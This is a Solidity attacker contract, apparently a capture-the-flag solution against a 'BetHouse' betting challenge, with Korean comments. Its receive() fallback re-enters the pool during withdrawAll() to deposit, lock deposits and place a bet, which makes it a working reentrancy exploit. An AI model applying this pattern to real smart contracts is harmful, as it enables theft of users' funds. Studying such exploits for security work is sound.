// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IBetHouse} from "src/IBetHouse.sol";
import {IPool} from "src/IPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {
    
    IBetHouse targetInst;
    IPool targetPool;
    IERC20 depositToken;
    address public player;
    
    error InsufficientBalance();

    constructor(IBetHouse target) {
        targetInst = target;
        targetPool = IPool(target.pool());
        depositToken = IERC20(targetPool.depositToken());
        player = msg.sender;
    }

    function attack() public payable {
        // 공격 소요자원: 0.001 ETH, 5 deposit token
        require(address(this).balance >= 0.001 ether, InsufficientBalance());
        require(depositToken.balanceOf(address(this)) >= 5, InsufficientBalance());
        
        depositToken.approve(address(targetPool), type(uint256).max);
        targetPool.deposit{ value: 0.001 ether }(5);
        targetPool.withdrawAll();
    }

    receive() external payable {
        // withdrawAll로부터 호출됨
        // Pool로부터 deposit token은 돌려받았으나 아직 wrappedToken은 회수가 안된 상태

        targetPool.deposit(5);
        targetPool.lockDeposits();
        targetInst.makeBet(player);
    }
}